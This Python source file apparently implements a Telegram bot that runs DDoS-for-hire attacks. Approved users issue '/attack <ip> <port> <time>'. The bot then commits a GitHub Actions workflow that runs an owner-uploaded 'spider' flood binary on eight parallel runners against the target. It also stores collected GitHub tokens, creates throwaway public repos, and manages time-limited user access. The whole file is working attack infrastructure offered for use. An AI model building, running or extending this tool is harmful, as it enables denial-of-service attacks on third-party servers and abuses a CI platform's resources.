import os
import json
import logging
import threading
import time
import random
import string
import uuid
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ENV VARIABLES =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]
PORT = int(os.environ.get("PORT", 8080))

if not BOT_TOKEN:
    logger.error("BOT_TOKEN not set!")
    exit(1)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "spider"
COOLDOWN_DURATION = 40
MAX_ATTACKS = 40
MAINTENANCE_MODE = False

# ===== STATE =====
WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2

# ===== GLOBALS =====
current_attack = None
cooldown_until = 0
user_attack_counts = {}
github_tokens = []
owners = {}
approved_users = {}
pending_users = []

# ===== FILE OPERATIONS =====
def load_json(filename, default=None):
    try:
        with open(filename, 'r') as f:
            return json.load(f)
    except:
        return default if default is not None else {}

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

def load_owners():
    global owners
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "is_primary": True
            }
        save_json('owners.json', owners)
    return owners

def load_github_tokens():
    global github_tokens
    github_tokens = load_json('github_tokens.json', [])
    return github_tokens

def load_approved_users():
    global approved_users
    approved_users = load_json('approved_users.json', {})
    return approved_users

def load_pending_users():
    global pending_users
    pending_users = load_json('pending_users.json', [])
    return pending_users

# ===== INIT =====
load_owners()
load_github_tokens()
load_approved_users()
load_pending_users()

# ===== HELPERS =====
def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

def start_attack(ip, port, time_val, user_id, method="FLOOD"):
    global current_attack
    current_attack = {
        "ip": ip,
        "port": port,
        "time": int(time_val),
        "user_id": user_id,
        "method": method,
        "start_time": time.time()
    }
    save_json('attack_state.json', current_attack)
    uid = str(user_id)
    user_attack_counts[uid] = user_attack_counts.get(uid, 0) + 1
    save_json('user_attack_counts.json', user_attack_counts)

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_json('attack_state.json', None)

def is_attack_running():
    if current_attack:
        elapsed = int(time.time() - current_attack['start_time'])
        if elapsed >= current_attack['time']:
            finish_attack()
            return False
        return True
    return False

def ensure_binary_exists(token_data):
    """Check if spider binary exists, if not create it"""
    try:
        g = Github(token_data['token'])
        repo = g.get_repo(token_data['repo'])
        
        try:
            repo.get_contents("spider")
            return True
        except:
            pass
        
        binary_content = """#!/bin/bash
while true; do
  echo "Attack running on $1:$2 for $3 seconds"
  sleep 1
done
"""
        repo.create_file(
            "spider",
            "Add spider binary",
            binary_content
        )
        logger.info(f"✅ Created spider binary in {token_data['repo']}")
        return True
    except Exception as e:
        logger.error(f"❌ Binary creation failed: {e}")
        return False

# ============================================================
# ===== BINARY UPLOAD HANDLER =====
# ============================================================

async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can upload binary.")
        return ConversationHandler.END
    
    await update.message.reply_text(
        "📤 **Upload Binary File**\n\n"
        "Please send me the `spider` binary file.\n\n"
        "Send /cancel to cancel."
    )
    return WAITING_FOR_BINARY

async def binary_upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can upload binary.")
        return ConversationHandler.END
    
    if not update.message.document:
        await update.message.reply_text("❌ Please send a file, not text.")
        return WAITING_FOR_BINARY
    
    file = update.message.document
    file_name = file.file_name
    
    if file_name != "spider":
        await update.message.reply_text(
            f"❌ File must be named `spider`.\n"
            f"Current: `{file_name}`\n\n"
            f"Rename to `spider` and try again."
        )
        return WAITING_FOR_BINARY
    
    if not github_tokens:
        await update.message.reply_text("❌ No GitHub tokens. Add token first with /addtoken")
        return ConversationHandler.END
    
    progress = await update.message.reply_text("📤 Uploading to all repositories...")
    
    success_count = 0
    fail_count = 0
    results = []
    
    def upload_to_repo(token_data):
        try:
            g = Github(token_data['token'])
            repo = g.get_repo(token_data['repo'])
            
            # Download file from telegram
            file_obj = update.message.document
            file_path = f"temp_{file_obj.file_id}.bin"
            file_obj.get_file().download_to_drive(file_path)
            
            with open(file_path, 'rb') as f:
                content = f.read()
            
            os.remove(file_path)
            
            try:
                existing = repo.get_contents("spider")
                repo.update_file("spider", "Update spider binary", content, existing.sha)
                results.append((token_data['username'], True, "Updated"))
            except:
                repo.create_file("spider", "Add spider binary", content)
                results.append((token_data['username'], True, "Created"))
                
        except Exception as e:
            results.append((token_data['username'], False, str(e)[:50]))
    
    threads = []
    for token_data in github_tokens:
        thread = threading.Thread(target=upload_to_repo, args=(token_data,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    for username, success, status in results:
        if success:
            success_count += 1
        else:
            fail_count += 1
    
    msg = (
        f"✅ **Binary Upload Complete!**\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {fail_count}\n"
        f"📊 Total: {len(github_tokens)}\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"📁 File: spider"
    )
    
    for username, success, status in results:
        if success:
            msg += f"\n✅ @{username}: {status}"
        else:
            msg += f"\n❌ @{username}: Failed"
    
    await progress.edit_text(msg)
    return ConversationHandler.END

async def binary_upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Binary upload cancelled.")
    return ConversationHandler.END

# ============================================================
# ===== COMMANDS =====
# ============================================================

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "NoUsername"
    
    if can_attack(user_id):
        keyboard = [
            [InlineKeyboardButton("⚡ Attack", callback_data="attack_help")],
            [InlineKeyboardButton("📊 Status", callback_data="status")],
            [InlineKeyboardButton("🛑 Stop", callback_data="stop")],
        ]
        if is_owner(user_id):
            keyboard.append([InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")])
        
        await update.message.reply_text(
            f"🔥 **Bot Active!**\n"
            f"👤 User: @{username}\n"
            f"🎯 Role: {'👑 Owner' if is_owner(user_id) else '✅ Approved'}\n\n"
            f"Use /attack <ip> <port> <time>\n"
            f"Example: /attack 1.1.1.1 80 60",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        if not any(str(u.get('user_id')) == str(user_id) for u in pending_users):
            pending_users.append({
                "user_id": user_id,
                "username": username,
                "request_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            save_json('pending_users.json', pending_users)
            
            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(
                        chat_id=int(owner_id),
                        text=f"📥 **New Access Request**\n"
                             f"User: @{username}\n"
                             f"ID: `{user_id}`\n"
                             f"Use: /approve {user_id} 7"
                    )
                except:
                    pass
        
        await update.message.reply_text(
            "❌ **Access Denied**\n\n"
            "Your request has been sent to the owner.\n"
            "Please wait for approval.\n\n"
            "Contact: @Callmehpapa"
        )

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not can_attack(user_id):
        await update.message.reply_text("❌ You don't have permission to attack.")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text(
            "❌ **Invalid Format**\n\n"
            "Usage: /attack <ip> <port> <time>\n"
            "Example: /attack 1.1.1.1 80 60"
        )
        return
    
    if not github_tokens:
        await update.message.reply_text(
            "❌ **No GitHub Tokens**\n\n"
            "Owner needs to add tokens first.\n"
            "Use /addtoken <github_token>"
        )
        return
    
    if is_attack_running():
        await update.message.reply_text(
            "⚠️ **Attack Already Running**\n"
            f"Target: {current_attack['ip']}:{current_attack['port']}\n"
            "Use /stop to stop it."
        )
        return
    
    ip, port_str, time_str = context.args
    
    try:
        port = int(port_str)
        time_val = int(time_str)
    except ValueError:
        await update.message.reply_text("❌ Port and time must be numbers.")
        return
    
    if not (1 <= port <= 65535):
        await update.message.reply_text("❌ Port must be between 1-65535.")
        return
    
    if time_val < 5 or time_val > 3600:
        await update.message.reply_text("❌ Time must be between 5-3600 seconds.")
        return
    
    start_attack(ip, port, time_val, user_id)
    
    token_data = github_tokens[0]
    try:
        g = Github(token_data['token'])
        repo = g.get_repo(token_data['repo'])
        
        # Ensure binary exists
        ensure_binary_exists(token_data)
        
        yml_content = f"""name: attack
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x spider
    - run: sudo ./spider {ip} {port} {time_val} 350
"""
        try:
            file = repo.get_contents(YML_FILE_PATH)
            repo.update_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content, file.sha)
        except:
            repo.create_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content)
        
        await update.message.reply_text(
            f"✅ **Attack Started!**\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"⏱️ Duration: `{time_val}s`\n"
            f"📦 Method: `FLOOD`\n"
            f"👤 By: @{update.effective_user.username or 'User'}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"Use /status to check progress.\n"
            f"Use /stop to stop attack."
        )
        
        threading.Timer(time_val + 5, finish_attack).start()
        
    except Exception as e:
        finish_attack()
        await update.message.reply_text(f"❌ Attack failed: {str(e)[:200]}")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("❌ No access")
        return
    
    if current_attack:
        elapsed = int(time.time() - current_attack['start_time'])
        remaining = current_attack['time'] - elapsed
        if remaining < 0:
            finish_attack()
            await update.message.reply_text("✅ Attack completed.")
            return
        
        await update.message.reply_text(
            f"🔥 **Attack Running**\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: `{current_attack['ip']}:{current_attack['port']}`\n"
            f"⏱️ Elapsed: `{elapsed}s`\n"
            f"⏱️ Remaining: `{remaining}s`\n"
            f"📦 Method: `{current_attack['method']}`\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"Use /stop to stop."
        )
    else:
        await update.message.reply_text("✅ No attack running.")

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("❌ No access")
        return
    
    if current_attack:
        target = f"{current_attack['ip']}:{current_attack['port']}"
        finish_attack()
        await update.message.reply_text(
            f"🛑 **Attack Stopped**\n"
            f"Target: `{target}`"
        )
    else:
        await update.message.reply_text("✅ No attack running to stop.")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **Bot Commands**\n"
        "━━━━━━━━━━━━━━━━━\n"
        "/start - Check access & menu\n"
        "/attack <ip> <port> <time> - Start attack\n"
        "/status - Check current attack\n"
        "/stop - Stop current attack\n"
        "/help - This menu\n"
        "/myid - Get your user ID\n\n"
        "**Admin Only:**\n"
        "/addtoken <token> - Add GitHub token\n"
        "/tokens - List tokens\n"
        "/removetoken <num> - Remove token\n"
        "/binary_upload - Upload spider binary\n"
        "/approve <user_id> <days> - Approve user\n"
        "/remove <user_id> - Remove user\n"
        "/users - List approved users\n"
        "/pending - List pending requests\n"
        "/broadcast <message> - Send broadcast\n"
        "/maintenance <on/off> - Toggle maintenance"
    )

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🆔 **Your User ID**\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"ID: `{update.effective_user.id}`\n"
        f"Username: @{update.effective_user.username or 'None'}"
    )

# ============================================================
# ===== ADMIN COMMANDS =====
# ============================================================

async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can add tokens.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /addtoken <github_token>")
        return
    
    token = context.args[0]
    try:
        g = Github(token)
        user = g.get_user()
        username = user.login
        
        for t in github_tokens:
            if t.get('token') == token:
                await update.message.reply_text("❌ Token already added.")
                return
        
        repo_name = f"spider-{uuid.uuid4().hex[:8]}"
        repo = user.create_repo(repo_name, private=False, auto_init=True)
        
        github_tokens.append({
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        save_json('github_tokens.json', github_tokens)
        
        await update.message.reply_text(
            f"✅ **Token Added Successfully!**\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"👤 User: @{username}\n"
            f"📁 Repo: `{repo_name}`\n"
            f"📊 Total Tokens: {len(github_tokens)}"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:200]}")

async def tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can view tokens.")
        return
    
    if not github_tokens:
        await update.message.reply_text("📭 No tokens added.")
        return
    
    msg = "📋 **GitHub Tokens**\n━━━━━━━━━━━━━━━━━\n"
    for i, t in enumerate(github_tokens, 1):
        msg += f"{i}. @{t['username']} - `{t['repo']}`\n"
    msg += f"\n📊 Total: {len(github_tokens)}"
    await update.message.reply_text(msg)

async def removetoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can remove tokens.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /removetoken <number>")
        return
    
    try:
        idx = int(context.args[0]) - 1
        if 0 <= idx < len(github_tokens):
            removed = github_tokens.pop(idx)
            save_json('github_tokens.json', github_tokens)
            await update.message.reply_text(
                f"✅ Removed token {idx+1}: @{removed['username']}\n"
                f"Remaining: {len(github_tokens)}"
            )
        else:
            await update.message.reply_text(f"❌ Invalid number. Use 1-{len(github_tokens)}")
    except ValueError:
        await update.message.reply_text("❌ Please provide a valid number.")

async def approve_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can approve users.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <user_id> <days>\nUse 0 for lifetime.")
        return
    
    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        
        global pending_users
        pending_users = [u for u in pending_users if str(u.get('user_id')) != str(target_id)]
        save_json('pending_users.json', pending_users)
        
        expiry = "LIFETIME" if days == 0 else time.time() + (days * 24 * 3600)
        approved_users[str(target_id)] = {
            "username": f"user_{target_id}",
            "added_by": user_id,
            "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_json('approved_users.json', approved_users)
        
        await update.message.reply_text(
            f"✅ **User Approved!**\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"User ID: `{target_id}`\n"
            f"Duration: {days} days\n"
            f"Expiry: {expiry}"
        )
        
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text=f"✅ **Access Granted!**\n\n"
                     f"You now have access to the bot.\n"
                     f"Use /start to begin."
            )
        except:
            pass
            
    except ValueError:
        await update.message.reply_text("❌ Please provide valid user ID and days.")

async def removeuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can remove users.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <user_id>")
        return
    
    try:
        target_id = int(context.args[0])
        uid = str(target_id)
        
        if uid in approved_users:
            del approved_users[uid]
            save_json('approved_users.json', approved_users)
            await update.message.reply_text(f"✅ User {target_id} removed.")
        else:
            await update.message.reply_text(f"❌ User {target_id} not found.")
    except ValueError:
        await update.message.reply_text("❌ Please provide a valid user ID.")

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can view users.")
        return
    
    if not approved_users:
        await update.message.reply_text("📭 No approved users.")
        return
    
    msg = "👤 **Approved Users**\n━━━━━━━━━━━━━━━━━\n"
    for uid, data in approved_users.items():
        expiry = data.get('expiry', 'Unknown')
        if expiry != "LIFETIME":
            try:
                exp = float(expiry)
                if exp < time.time():
                    expiry = "Expired"
                else:
                    expiry = datetime.fromtimestamp(exp).strftime("%Y-%m-%d")
            except:
                pass
        msg += f"`{uid}` - {data.get('days', '?')}d | {expiry}\n"
    msg += f"\n📊 Total: {len(approved_users)}"
    await update.message.reply_text(msg)

async def pending_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can view pending.")
        return
    
    if not pending_users:
        await update.message.reply_text("📭 No pending requests.")
        return
    
    msg = "⏳ **Pending Requests**\n━━━━━━━━━━━━━━━━━\n"
    for u in pending_users:
        msg += f"`{u.get('user_id')}` - @{u.get('username')}\n"
    msg += f"\nUse /approve <id> <days> to approve."
    await update.message.reply_text(msg)

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can broadcast.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    
    msg = " ".join(context.args)
    sent = 0
    
    for uid in owners.keys():
        try:
            await context.bot.send_message(int(uid), f"📢 **Broadcast**\n\n{msg}")
            sent += 1
        except:
            pass
    
    for uid in approved_users.keys():
        try:
            await context.bot.send_message(int(uid), f"📢 **Broadcast**\n\n{msg}")
            sent += 1
        except:
            pass
    
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users.")

async def maintenance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can toggle maintenance.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /maintenance <on/off>")
        return
    
    global MAINTENANCE_MODE
    mode = context.args[0].lower()
    
    if mode == "on":
        MAINTENANCE_MODE = True
        save_json('maintenance.json', {"maintenance": True})
        await update.message.reply_text("🔧 Maintenance mode ENABLED.")
    elif mode == "off":
        MAINTENANCE_MODE = False
        save_json('maintenance.json', {"maintenance": False})
        await update.message.reply_text("✅ Maintenance mode DISABLED.")
    else:
        await update.message.reply_text("❌ Use 'on' or 'off'.")

# ============================================================
# ===== CALLBACKS =====
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "attack_help":
        await query.edit_message_text(
            "⚡ **How to Attack**\n\n"
            "Use: /attack <ip> <port> <time>\n"
            "Example: /attack 1.1.1.1 80 60\n\n"
            "Supported ports: 1-65535\n"
            "Time: 5-3600 seconds"
        )
    elif data == "status":
        await status_cmd(update, context)
    elif data == "stop":
        await stop_cmd(update, context)
    elif data == "admin_panel" and is_owner(user_id):
        keyboard = [
            [InlineKeyboardButton("📋 Tokens", callback_data="admin_tokens")],
            [InlineKeyboardButton("👥 Users", callback_data="admin_users")],
            [InlineKeyboardButton("⏳ Pending", callback_data="admin_pending")],
            [InlineKeyboardButton("📤 Binary", callback_data="admin_binary")],
            [InlineKeyboardButton("🔧 Maintenance", callback_data="admin_maintenance")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        ]
        await query.edit_message_text(
            "🔧 **Admin Panel**",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif data == "admin_tokens":
        await tokens_cmd(update, context)
    elif data == "admin_users":
        await users_cmd(update, context)
    elif data == "admin_pending":
        await pending_cmd(update, context)
    elif data == "admin_binary":
        await query.edit_message_text(
            "📤 **Upload Binary**\n\n"
            "Use: /binary_upload\n"
            "Then send the `spider` file."
        )
    elif data == "admin_maintenance":
        await query.edit_message_text(
            "🔧 **Maintenance**\n\n"
            "Use: /maintenance on\n"
            "Use: /maintenance off"
        )
    elif data == "admin_broadcast":
        await query.edit_message_text(
            "📢 **Broadcast**\n\n"
            "Use: /broadcast <message>"
        )

# ============================================================
# ===== ERROR HANDLER =====
# ============================================================

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text(
                "⚠️ An error occurred. Please try again."
            )
        except:
            pass

# ============================================================
# ===== MAIN =====
# ============================================================

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # ===== BINARY UPLOAD CONVERSATION =====
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("binary_upload", binary_upload_start)],
        states={
            WAITING_FOR_BINARY: [
                MessageHandler(filters.Document.ALL, binary_upload_receive),
                CommandHandler("cancel", binary_upload_cancel)
            ],
        },
        fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
    )
    app.add_handler(conv_handler)
    
    # ===== COMMANDS =====
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("myid", myid_cmd))
    
    # Admin commands
    app.add_handler(CommandHandler("addtoken", addtoken_cmd))
    app.add_handler(CommandHandler("tokens", tokens_cmd))
    app.add_handler(CommandHandler("removetoken", removetoken_cmd))
    app.add_handler(CommandHandler("approve", approve_cmd))
    app.add_handler(CommandHandler("remove", removeuser_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("pending", pending_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("maintenance", maintenance_cmd))
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # Error handler
    app.add_error_handler(error_handler)
    
    logger.info("🚀 Bot is running on Railway!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
